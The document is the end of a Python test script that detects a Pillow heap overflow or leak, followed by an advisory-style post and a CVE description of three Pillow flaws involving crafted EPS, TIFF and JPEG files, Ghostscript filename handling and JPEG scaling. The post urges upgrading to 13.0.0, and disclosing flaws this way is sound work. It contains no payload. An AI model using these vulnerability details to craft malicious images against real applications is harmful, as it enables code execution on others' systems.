print(stale or "  outputs identical")
leak = "BytesIO 0x55" in stale
print(f"-> BytesIO output contains never-written heap bytes: {leak}\n")

print("BUG" if overflow or leak else "OK")
```

Three critical flaws (CVE-2026-112900, CVE-2026-112393, CVE-2026-112403, CVSS 9.2 each) let a crafted EPS, TIFF, or JPEG file trigger remote code execution or heap corruption. The EPS one shells out to Ghostscript with your filename completely unguarded. That is not a bug in this tutorial. That is the mechanic.

To remove the debuff, upgrade Pillow to 13.0.0 immediately. (2/3)

CVE-2026-112403.description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's JPEG decoder can write a full-width scanline into a buffer sized for a requested draft scale. ImagingJpegDecode does not verify libjpeg's actual output width and component count after scaling is requested, and an 8-bit lossless SOF3 JPEG decoded by a build linked to libjpeg-turbo 3.x can ignore the requested downscaling geometry. An attacker can supply such a JPEG to an application that uses draft() or thumbnail() to request downscaling. This can corrupt heap memory, crash the process, or potentially allow code execution. Older libjpeg-turbo 2.x and IJG builds reject the SOF3 input. This issue is fixed in version 13.0.0.
